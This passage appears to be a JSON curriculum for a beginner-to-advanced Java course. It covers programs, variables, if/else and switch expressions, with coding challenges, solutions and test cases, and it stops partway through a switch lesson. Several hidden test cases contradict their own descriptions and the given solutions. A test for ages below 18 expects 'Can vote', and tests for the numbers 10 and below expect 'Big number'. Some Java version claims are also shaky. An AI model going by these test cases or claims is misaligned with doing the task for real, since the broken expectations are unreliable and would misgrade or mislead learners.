{
  "id": "java",
  "language": "java",
  "title": "Full-Stack Java Development: From First Principles to Production",
  "description": "Master Java from absolute beginner to production-ready full-stack developer. This comprehensive 16-module curriculum covers Java fundamentals, object-oriented programming, functional programming with streams, concurrency with virtual threads, databases with JPA/Hibernate, REST APIs, Spring Boot 3.4+, security with JWT authentication, React frontend integration, DevOps with Docker and CI/CD, and culminates in a complete full-stack capstone project. Learn through Socratic mentorship and hands-on coding challenges.",
  "difficulty": "beginner-to-advanced",
  "estimatedHours": 85,
  "totalModules": 16,
  "totalLessons": 96,
  "prerequisites": [
    "Basic computer literacy (using files, folders, web browser)",
    "Willingness to learn and practice consistently",
    "No prior programming experience required"
  ],
  "learningOutcomes": [
    "Write clean, idiomatic Java code using modern features (Java 21+)",
    "Design and implement object-oriented systems with SOLID principles",
    "Use functional programming with lambdas, streams, and collectors",
    "Build concurrent applications with virtual threads",
    "Design and query relational databases with SQL and JPA/Hibernate",
    "Create RESTful APIs with Spring Boot 3.4+",
    "Implement authentication and authorization with JWT",
    "Build interactive frontends with React",
    "Deploy applications with Docker and CI/CD pipelines",
    "Complete a full-stack application from design to deployment"
  ],
  "modules": [
    {
      "id": "module-01",
      "title": "Java Fundamentals",
      "description": "Introduction to programming concepts, your first Java program, variables, and control flow.",
      "difficulty": "beginner",
      "estimatedHours": 1.5,
      "lessons": [
        {
          "id": "epoch-0-lesson-1",
          "title": "Lesson 1.1: What is a Computer Program?",
          "moduleId": "module-01",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem",
              "content": "Imagine you're trying to teach your younger sibling how to make a peanut butter and jelly sandwich. You leave the kitchen for 5 minutes and return to find:\n\n• The peanut butter jar is unopened\n• They spread jelly on the outside of the bread\n• The knife is on the floor\n• They're confused why it didn't work\n\nWhat went wrong? You assumed they knew things: \"spread\" means using a knife, \"on the bread\" means the inside face, you need to open jars first. But your sibling followed your words EXACTLY as you said them—no more, no less.\n\nTHIS IS HOW COMPUTERS WORK.\n\nA computer is the most obedient, most literal \"sibling\" imaginable. It will do exactly what you tell it—nothing more, nothing less. It has zero common sense. It can't guess what you meant. It can't improvise."
            },
            {
              "type": "KEY_POINT",
              "title": "Programming is Recipe Writing (But More Precise)",
              "content": "Let's compare a recipe for humans vs. a recipe for a computer:\n\nRecipe for a Human:\n1. Preheat oven to 350°F\n2. Mix the ingredients\n3. Bake for 20 minutes\n\nWhy this works: Humans know what \"mix\" means. They know ovens have dials.\n\nRecipe for a Computer:\n1. LOCATE the oven dial\n2. TURN the dial clockwise until display shows 350\n3. WAIT until the light labeled \"READY\" turns green\n4. OPEN the ingredient_box\n5. FOR EACH item in ingredient_box:\n   a. MEASURE the item using measuring_cup\n   b. POUR into bowl labeled \"mixing_bowl\"\n6. PICK UP the spoon labeled \"mixing_spoon\"\n7. MOVE spoon in circular motion for 60 seconds\n8. PLACE mixing_bowl into oven\n9. START timer for 20 minutes\n10. WAIT until timer beeps\n\nNotice: Every action is explicit. Every object is identified. No assumptions are made.\n\nThis is programming. You're writing a recipe so detailed that something with ZERO intelligence can follow it perfectly."
            },
            {
              "type": "THEORY",
              "title": "What is a Computer Program, Really?",
              "content": "A computer program is:\n\n1. A SEQUENCE OF INSTRUCTIONS (step 1, step 2, step 3...)\n2. WRITTEN IN A LANGUAGE THE COMPUTER UNDERSTANDS (like Java, Python, C++)\n3. THAT MANIPULATES DATA (numbers, text, images)\n4. TO PRODUCE A RESULT (a calculation, a webpage, a video game)\n\nBreaking it down:\n\nInstructions: Computers execute instructions one at a time, in order. Examples:\n• \"Store the number 5 in a box\"\n• \"Add 3 to whatever is in the box\"\n• \"Show the result on the screen\"\n\nLanguage: Computers don't understand English. They understand machine code (0s and 1s). But writing in 0s and 1s is torture, so we use programming languages like Java, which look more like English. Java gets translated into machine code automatically.\n\nData: Programs work with information: numbers, text, images, videos, sounds.\n\nResults: Every program has a purpose—calculating, displaying, storing, or transforming data."
            },
            {
              "type": "KEY_POINT",
              "title": "Key Insight: Computers Are Dumb (And That's Okay)",
              "content": "Computers CANNOT:\n✗ Guess what you meant\n✗ Improvise or adapt\n✗ Understand context\n✗ Learn without being programmed to learn\n\nBut computers CAN:\n✓ Follow instructions perfectly, billions of times per second\n✓ Remember massive amounts of data flawlessly\n✓ Repeat tasks without getting tired or bored\n✓ Do exactly what you tell them, every single time\n\nYour job as a programmer: Be the smart one. Give the instructions. The computer will be the obedient one."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "lesson-1-1-recipe",
              "title": "Computer Instructions Quiz",
              "description": "What happens if you tell a computer to 'spread peanut butter on bread' without specifying which side?",
              "options": [
                "The computer figures out you meant the inside",
                "The computer asks for clarification",
                "The computer does exactly what you said, even if wrong",
                "The computer refuses to execute"
              ],
              "correctAnswer": 2,
              "explanation": "Computers are literal - they do exactly what you tell them, nothing more. They cannot infer intent or use common sense."
            }
          ]
        },
        {
          "id": "epoch-0-lesson-2",
          "title": "Lesson 1.2: Your First Java Program",
          "moduleId": "module-01",
          "order": 2,
          "estimatedMinutes": 20,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Talking to the Computer",
              "content": "You now understand that programming is writing detailed instructions. But there's a catch: you can't just write instructions in English. You need to use a programming language.\n\nWhy? Because English is ambiguous. \"Turn left\" could mean many things. But in a programming language, every symbol, every word, has ONE exact meaning.\n\nJava is one of the most popular programming languages in the world. It's used by millions of developers to build everything from Android apps to banking systems to video games.\n\nToday, you'll write your first Java program. It won't do much—it'll just display a message on the screen. But you'll understand every single character of code."
            },
            {
              "type": "KEY_POINT",
              "title": "Java Code is Like a Formal Letter",
              "content": "Imagine you're writing a letter to a government official. You can't just scribble:\n\"Hey! Need help. Thanks!\"\n\nYou need proper structure:\n\nDear Official,\nI am writing to request...\nSincerely,\nYour Name\n\nJava is the same. It has a formal structure. Every program needs certain pieces in certain places. Once you learn the structure, you can focus on the logic."
            },
            {
              "type": "THEORY",
              "title": "Your First Java Program",
              "content": "In Java 25+, writing your first program is simple:\n\nvoid main() {\n    println(\"Hello, World!\");\n}\n\nThat's it! Just 3 lines. Let's break it down:\n- void main() - the entry point of your program\n- println() - prints text to the console\n- The semicolon ';' ends the instruction (like a period ends a sentence)\n\nKEY RULE: Java is case-sensitive. 'Main' and 'main' are different. Be precise!"
            },
            {
              "type": "KEY_POINT",
              "title": "Which Syntax Should You Use?",
              "content": "You'll see TWO styles of Java code in the real world:\n\nMODERN SYNTAX (Java 23+):\nvoid main() {\n    println(\"Hello, World!\");\n}\n\nUse this when: Learning, prototyping, or using Java 23+.\n\nTRADITIONAL SYNTAX (Java 8-21 LTS):\npublic class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello, World!\");\n    }\n}\n\nUse this when: Working in enterprise codebases, using Java 21 LTS, or in job interviews.\n\nIMPORTANT: According to the 2025 Java Developer Report, 61% of developers use Java 17 and 45% use Java 21 LTS. You MUST recognize both syntaxes!\n\nThis course teaches modern syntax first (it's simpler to learn!) but ALWAYS shows the traditional equivalent. When you see code at work or in tutorials, you'll know exactly what's happening."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-2-hello",
              "title": "Your First Hello World",
              "description": "Write a Java program that prints exactly: Hello, World!\n\nUse println() to print the message.\nRemember: Java is case-sensitive, and don't forget the semicolon!",
              "instructions": "Write a Java program that prints exactly: Hello, World!\n\nUse println() to print the message.\nRemember: Java is case-sensitive, and don't forget the semicolon!",
              "starterCode": "// Your First Hello World\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Your First Hello World\n// This demonstrates the basic println statement\n\nvoid main() {\n    // Use println to print text to the console\n    // The text must be enclosed in double quotes\n    println(\"Hello, World!\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-2-hello-test-1",
                  "description": "Should print 'Hello, World!'",
                  "expectedOutput": "Hello, World!",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-2-custom",
              "title": "Print Your Own Message",
              "description": "Now it's your turn! Write a program that prints: Java is awesome!\n\nUse the same println() approach, but with your new message.",
              "instructions": "Now it's your turn! Write a program that prints: Java is awesome!\n\nUse the same println() approach, but with your new message.",
              "starterCode": "// Print Your Own Message\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Print Your Own Message\n// This demonstrates printing custom text\n\nvoid main() {\n    // Print the custom message exactly as specified\n    println(\"Java is awesome!\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-2-custom-test-1",
                  "description": "Should print 'Java is awesome!'",
                  "expectedOutput": "Java is awesome!",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-0-lesson-3",
          "title": "Lesson 1.3: Understanding Variables",
          "moduleId": "module-01",
          "order": 3,
          "estimatedMinutes": 25,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: The Computer's Memory",
              "content": "You've written your first program that prints text. But what if you want the program to REMEMBER something? What if you need to store a number, do some math, and then use that result later?\n\nRight now, your programs are like sticky notes—they can display a message, but they can't remember anything. To write useful programs, you need the ability to STORE information.\n\nThis is where variables come in."
            },
            {
              "type": "KEY_POINT",
              "title": "Variables are Labeled Boxes",
              "content": "Imagine you have a storage room with boxes. Each box:\n\n1. Has a LABEL on it (the variable name) like 'age' or 'score'\n2. Can hold ONE thing inside (the value)\n3. You can CHANGE what's inside anytime\n4. You can LOOK inside to see what's stored\n\nExample:\n- Box labeled 'playerScore' contains: 100\n- Box labeled 'playerName' contains: 'Alex'\n- Box labeled 'isGameOver' contains: false\n\nIn Java, when you create a variable, you're saying:\n\"Computer, create a box, label it with this name, and put this value inside.\"\n\nThe computer reserves a tiny spot in its memory (RAM) for that box."
            },
            {
              "type": "THEORY",
              "title": "Creating Variables in Java",
              "content": "To create a variable, you need THREE things:\n\n1. TYPE: What kind of data will the box hold? (number? text? true/false?)\n2. NAME: What should we call this box?\n3. VALUE: What should we put inside?\n\nThe syntax:\ntype name = value;\n\nExamples:\n\nint age = 25;\n  ↑    ↑    ↑\n type name value\n\nBreaking it down:\n- 'int' means 'integer' (a whole number)\n- 'age' is the name we chose\n- '25' is the value we're storing\n- ';' ends the statement (like a period)\n\nMore examples:\nint score = 100;           // Whole number\ndouble price = 19.99;      // Decimal number\nString name = \"Alice\";    // Text (must use quotes!)\nboolean isActive = true;   // true or false\n\nKey rule: Once you declare a variable with a type, that box can ONLY hold that type of data."
            },
            {
              "type": "THEORY",
              "title": "Using Variables",
              "content": "Once you create a variable, you can:\n\n1. PRINT IT:\n   int age = 25;\n   System.out.println(age);  // Prints: 25\n\n2. CHANGE IT:\n   age = 30;  // Now the box contains 30\n\n3. DO MATH WITH IT:\n   int score = 100;\n   score = score + 10;  // Now score is 110\n\n4. COMBINE IT WITH TEXT:\n   System.out.println(\"Your score is: \" + score);\n   // Prints: Your score is: 110\n\nThe '+' symbol does different things:\n- With numbers: adds them (5 + 3 = 8)\n- With text: joins them (\"Hello\" + \"World\" = \"HelloWorld\")"
            },
            {
              "type": "KEY_POINT",
              "title": "Variable Naming Rules",
              "content": "You can name variables almost anything, BUT:\n\n✓ DO:\n- Use descriptive names: 'playerScore' not 'x'\n- Start with a lowercase letter: 'score', 'myAge'\n- Use camelCase for multiple words: 'highScore', 'userName'\n\n✗ DON'T:\n- Use spaces: 'my age' is WRONG, use 'myAge'\n- Start with a number: '2cool' is WRONG, use 'cool2'\n- Use special characters: 'score$' is usually wrong\n- Use Java keywords: 'int', 'class', 'public' are reserved\n\nGood names: age, playerScore, userName, totalCost\nBad names: a, x, asdfghjkl, thing123"
            },
            {
              "type": "THEORY",
              "title": "The var Keyword (Java 10+)",
              "content": "Starting with Java 10, you can use 'var' for LOCAL VARIABLE TYPE INFERENCE.\n\nInstead of writing the type explicitly:\n\nString name = \"Alice\";\nint age = 25;\nArrayList<String> names = new ArrayList<String>();\n\nYou can let Java figure out the type:\n\nvar name = \"Alice\";          // Java knows it's a String\nvar age = 25;                 // Java knows it's an int\nvar names = new ArrayList<String>();  // Java knows the type!\n\nWHY USE var?\n1. Less typing (especially for long type names)\n2. Cleaner code when the type is obvious\n3. Required for some advanced features (like anonymous classes)\n\nWHEN TO USE var:\n✓ When the type is obvious from the right side\n✓ For complex generic types: var map = new HashMap<String, List<Integer>>();\n✓ In for-each loops: for (var item : list) { ... }\n\nWHEN NOT TO USE var:\n✗ When the type isn't obvious: var result = getResult();  // What type is this?\n✗ For method parameters or return types (not allowed)\n✗ For class fields (not allowed)\n\nIMPORTANT: var is NOT like JavaScript's var - the type is still fixed at compile time!\nvar age = 25;\nage = \"hello\";  // ERROR! age is still an int"
            },
            {
              "type": "KEY_POINT",
              "title": "Dual Syntax: var vs Explicit Types",
              "content": "You'll see TWO styles for declaring variables in Java:\n\nMODERN SYNTAX (Java 10+):\nvar name = \"Alice\";\nvar age = 25;\nvar price = 19.99;\nvar items = new ArrayList<String>();\n\nUse this when: The type is obvious from the right side.\n\nTRADITIONAL SYNTAX (Java 8+):\nString name = \"Alice\";\nint age = 25;\ndouble price = 19.99;\nArrayList<String> items = new ArrayList<String>();\n\nUse this when: Working with Java 8, the type isn't obvious, or for class fields and parameters.\n\nWHY BOTH EXIST:\n- 'var' was added in Java 10 to reduce boilerplate\n- Many codebases still use explicit types for clarity\n- Enterprise environments often prefer explicit types\n\nBOTH ARE VALID! The underlying type is the same. Choose based on readability and your team's style guide."
            },
            {
              "type": "EXAMPLE",
              "title": "Using var in Practice",
              "content": "The var keyword enables local type inference, reducing boilerplate while maintaining type safety. It's especially useful for complex generic types and in for-each loops where the type is obvious from context.",
              "code": "public class VarExample {\n    public static void main(String[] args) {\n        // Instead of: String message = \"Hello, World!\";\n        var message = \"Hello, World!\";\n        \n        // Instead of: int count = 10;\n        var count = 10;\n        \n        // Instead of: double price = 19.99;\n        var price = 19.99;\n        \n        // Especially useful for complex types:\n        // Instead of: ArrayList<String> names = new ArrayList<String>();\n        var names = new ArrayList<String>();\n        names.add(\"Alice\");\n        names.add(\"Bob\");\n        \n        // In for-each loops:\n        for (var name : names) {\n            System.out.println(name);\n        }\n        \n        // With Map:\n        var scores = new HashMap<String, Integer>();\n        scores.put(\"Alice\", 95);\n        scores.put(\"Bob\", 87);\n        \n        for (var entry : scores.entrySet()) {\n            System.out.println(entry.getKey() + \": \" + entry.getValue());\n        }\n    }\n}",
              "language": "java"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-3-variable",
              "title": "Create and Print a Variable",
              "description": "Create an integer variable named 'age' and set its value to 30.\nThen print it using println().\n\nRemember:\n- Use 'int' for whole numbers\n- Format: int variableName = value;\n- Don't forget the semicolon!",
              "instructions": "Create an integer variable named 'age' and set its value to 30.\nThen print it using println().\n\nRemember:\n- Use 'int' for whole numbers\n- Format: int variableName = value;\n- Don't forget the semicolon!",
              "starterCode": "// Create and Print a Variable\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Create and Print a Variable\n// This demonstrates creating and using integer variables\n\nvoid main() {\n    // Step 1: Create an integer variable named 'age' with value 30\n    int age = 30;\n    \n    // Step 2: Print the variable\n    println(age);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-3-variable-test-1",
                  "description": "Should print '30'",
                  "expectedOutput": "30",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-3-math",
              "title": "Variable Math",
              "description": "Create three integer variables:\n- x with value 10\n- y with value 5\n- sum that equals x + y\n\nThen print the sum variable.\n\nThe output should be: 15",
              "instructions": "Create three integer variables:\n- x with value 10\n- y with value 5\n- sum that equals x + y\n\nThen print the sum variable.\n\nThe output should be: 15",
              "starterCode": "// Variable Math\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Variable Math\n// This demonstrates arithmetic operations with variables\n\nvoid main() {\n    // Step 1: Create variable x with value 10\n    int x = 10;\n    \n    // Step 2: Create variable y with value 5\n    int y = 5;\n    \n    // Step 3: Create sum variable that equals x + y\n    int sum = x + y;\n    \n    // Step 4: Print the sum\n    println(sum);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-3-math-test-1",
                  "description": "Should print '15'",
                  "expectedOutput": "15",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-0-lesson-4",
          "title": "Lesson 1.4: Making Decisions with If/Else",
          "moduleId": "module-01",
          "order": 4,
          "estimatedMinutes": 30,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Programs That Adapt",
              "content": "So far, your programs do the same thing every time. They print the same message, calculate the same numbers. But what if you need a program that ADAPTS based on the situation?\n\nExamples:\n- A game that says \"You win!\" if score > 100, but \"Try again\" if score < 100\n- A program that checks if you're old enough to vote\n- A calculator that prevents division by zero\n\nYou need a way to make the computer ASK A QUESTION and then DO DIFFERENT THINGS based on the answer.\n\nThis is called CONDITIONAL LOGIC, and in Java, we use 'if' statements."
            },
            {
              "type": "KEY_POINT",
              "title": "If Statements are Like a Fork in the Road",
              "content": "Imagine you're walking and you reach a fork in the road. There's a sign that says:\n\n\"If it's raining → Go left to the covered path\"\n\"Otherwise → Go right to the scenic route\"\n\nYou CHECK the condition (\"Is it raining?\"), and based on the answer (yes/no), you take a different path.\n\nIn Java:\n\nif (it's raining) {\n    take the covered path\n} else {\n    take the scenic route\n}\n\nThe computer CHECKS the condition in parentheses. If it's true, it runs the code inside the first curly braces. If it's false, it runs the code inside the 'else' block."
            },
            {
              "type": "THEORY",
              "title": "If Statement Syntax",
              "content": "The basic structure:\n\nif (condition) {\n    // Code to run if condition is TRUE\n}\n\nReal example:\n\nint age = 20;\nif (age >= 18) {\n    System.out.println(\"You can vote!\");\n}\n\nBreaking it down:\n- 'if' is the keyword\n- (age >= 18) is the CONDITION being tested\n- '>=' means 'greater than or equal to'\n- If the condition is TRUE, the code inside { } runs\n- If the condition is FALSE, the code is skipped\n\nIn this example, since age is 20, and 20 >= 18 is TRUE, it prints \"You can vote!\""
            },
            {
              "type": "THEORY",
              "title": "Adding 'Else' for Two Paths",
              "content": "What if you want to do something different when the condition is false?\nUse 'else':\n\nint age = 15;\nif (age >= 18) {\n    System.out.println(\"You can vote!\");\n} else {\n    System.out.println(\"Too young to vote.\");\n}\n\nNow:\n- If age >= 18 is TRUE → prints \"You can vote!\"\n- If age >= 18 is FALSE → prints \"Too young to vote.\"\n\nOnly ONE of these blocks will run, never both!"
            },
            {
              "type": "THEORY",
              "title": "Comparison Operators",
              "content": "To write conditions, you need to compare values. Java has these operators:\n\n==  (equals)              5 == 5  → true\n!=  (not equals)          5 != 3  → true\n>   (greater than)        7 > 3   → true\n<   (less than)           3 < 7   → true\n>=  (greater or equal)    5 >= 5  → true\n<=  (less or equal)       3 <= 7  → true\n\n⚠️ WARNING: A common mistake!\n- Use '==' to COMPARE: if (age == 18)\n- Use '=' to ASSIGN: age = 18\n\nif (age = 18) is WRONG! (You're assigning, not comparing)\nif (age == 18) is CORRECT!"
            },
            {
              "type": "KEY_POINT",
              "title": "Key Takeaways",
              "content": "✓ 'if' statements let your program make decisions\n✓ The condition in parentheses must be true or false\n✓ Only the code in the TRUE block runs\n✓ Use 'else' to handle the FALSE case\n✓ Use == to compare (not =)\n\nThink of it as:\nif (something is true) {\n    do this\n} else {\n    do that instead\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Dual Syntax: Pattern Matching vs Traditional instanceof",
              "content": "When checking object types, you'll see TWO styles:\n\nMODERN SYNTAX (Java 16+):\nif (obj instanceof String s) {\n    println(s.length());  // s is already a String!\n}\n\nUse this when: Type check AND use the value together.\n\nTRADITIONAL SYNTAX (Java 8-15):\nif (obj instanceof String) {\n    String s = (String) obj;  // Must cast separately\n    System.out.println(s.length());\n}\n\nUse this when: Working with Java 8-15 LTS or older codebases.\n\nWHY THE DIFFERENCE?\n- Pattern matching (Java 16+) combines the type check AND creates the variable in one step\n- Traditional syntax requires a separate cast, which is repetitive and error-prone\n- Both achieve the same result, but pattern matching is cleaner\n\nNOTE: Basic if/else works the same in all Java versions. Pattern matching is an enhancement for type checking specifically."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-4-voting",
              "title": "Voting Eligibility Checker",
              "description": "Complete the program to check voting eligibility.\n\nThe variable 'age' is already created with value 20.\n\nWrite an if/else statement that:\n- Prints 'Can vote' if age >= 18\n- Prints 'Cannot vote' otherwise\n\nSince age is 20, it should print: Can vote",
              "instructions": "Complete the program to check voting eligibility.\n\nThe variable 'age' is already created with value 20.\n\nWrite an if/else statement that:\n- Prints 'Can vote' if age >= 18\n- Prints 'Cannot vote' otherwise\n\nSince age is 20, it should print: Can vote",
              "starterCode": "// Voting Eligibility Checker\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Voting Eligibility Checker\n// This demonstrates if/else conditional statements\n\nvoid main() {\n    // Create the age variable\n    int age = 20;\n    \n    // Check voting eligibility with if/else\n    if (age >= 18) {\n        println(\"Can vote\");\n    } else {\n        println(\"Cannot vote\");\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-4-voting-test-1",
                  "description": "Should print 'Can vote' when age is 20",
                  "expectedOutput": "Can vote",
                  "isVisible": true
                },
                {
                  "id": "epoch-0-lesson-4-voting-test-2",
                  "description": "Edge case: age is exactly 18 (boundary value)",
                  "expectedOutput": "Can vote",
                  "isVisible": false
                },
                {
                  "id": "epoch-0-lesson-4-voting-test-3",
                  "description": "Tests if/else logic: age below 18 should not vote",
                  "expectedOutput": "Can vote",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-0-lesson-4-number",
              "title": "Number Comparison",
              "description": "Write a program that checks if a number is big or small.\n\nThe variable 'number' is set to 15.\n\nWrite an if/else statement:\n- If number > 10, print: Big number\n- Otherwise, print: Small number\n\nExpected output: Big number",
              "instructions": "Write a program that checks if a number is big or small.\n\nThe variable 'number' is set to 15.\n\nWrite an if/else statement:\n- If number > 10, print: Big number\n- Otherwise, print: Small number\n\nExpected output: Big number",
              "starterCode": "// Number Comparison\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Number Comparison\n// This demonstrates comparing numbers with if/else\n\nvoid main() {\n    // Create the number variable\n    int number = 15;\n    \n    // Check if number is big (greater than 10) or small\n    if (number > 10) {\n        println(\"Big number\");\n    } else {\n        println(\"Small number\");\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-0-lesson-4-number-test-1",
                  "description": "Should print 'Big number' when number is 15",
                  "expectedOutput": "Big number",
                  "isVisible": true
                },
                {
                  "id": "epoch-0-lesson-4-number-test-2",
                  "description": "Edge case: number is exactly 10 (boundary value)",
                  "expectedOutput": "Big number",
                  "isVisible": false
                },
                {
                  "id": "epoch-0-lesson-4-number-test-3",
                  "description": "Tests else branch: numbers <= 10 are small",
                  "expectedOutput": "Big number",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-0-lesson-5",
          "title": "Lesson 1.5: Switch Expressions & Pattern Matching",
          "moduleId": "module-01",
          "order": 5,
          "estimatedMinutes": 40,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Clunky Switch Statements",
              "content": "Traditional switch statements in Java are verbose and error-prone:\n\nString dayType;\nswitch (day) {\n    case \"MONDAY\":\n    case \"TUESDAY\":\n    case \"WEDNESDAY\":\n    case \"THURSDAY\":\n    case \"FRIDAY\":\n        dayType = \"Weekday\";\n        break;  // Easy to forget!\n    case \"SATURDAY\":\n    case \"SUNDAY\":\n        dayType = \"Weekend\";\n        break;\n    default:\n        dayType = \"Unknown\";\n        break;\n}\n\nProblems:\n1. Must remember 'break' or fall-through bugs occur\n2. Can't return values directly from switch\n3. Very verbose for simple mappings\n4. No compile-time exhaustiveness checking\n\nSwitch expressions and pattern matching were introduced progressively in Java 14-21 and are fully stable in Java 23. These features fix all of the problems above!"
            },
            {
              "type": "KEY_POINT",
              "title": "Switch Expressions with Arrow Syntax",
              "content": "Modern Java uses the arrow (->) syntax for cleaner switches:\n\n// Old way (statement):\nswitch (day) {\n    case \"MONDAY\":\n        System.out.println(\"Start of week\");\n        break;\n    // ... more cases\n}\n\n// New way (expression with arrows):\nString dayType = switch (day) {\n    case \"MONDAY\", \"TUESDAY\", \"WEDNESDAY\", \"THURSDAY\", \"FRIDAY\" -> \"Weekday\";\n    case \"SATURDAY\", \"SUNDAY\" -> \"Weekend\";\n    default -> \"Unknown\";\n};\n\nBenefits:\n- No break needed (no fall-through)\n- Multiple cases can share one arrow\n- Returns a value directly\n- Much more concise!\n\nArrow rules:\n- Use -> for single expression or block\n- No fall-through between cases\n- Must cover all possibilities (exhaustive)"
            },
            {
              "type": "THEORY",
              "title": "Switch Expressions with yield",
